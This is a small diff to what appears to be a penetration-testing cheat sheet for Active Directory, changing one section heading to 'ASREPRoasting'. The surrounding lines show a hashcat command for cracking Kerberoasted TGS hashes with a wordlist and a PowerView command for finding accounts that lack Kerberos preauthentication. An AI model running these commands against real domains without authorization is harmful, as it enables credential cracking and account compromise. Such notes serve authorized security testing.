@@ -90,7 +90,7 @@ ToDo error
 ## Crack TGS tickets
 `hashcat -a 0 -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt`
 
-# 3. Kerberoasting
+# 4. ASREPRoasting
 ## Identify AS-REP roastable users
 ### PowerView-Dev
 `Get-DomainUser -PreauthNotRequired | ft samaccountname, pwdlastset`
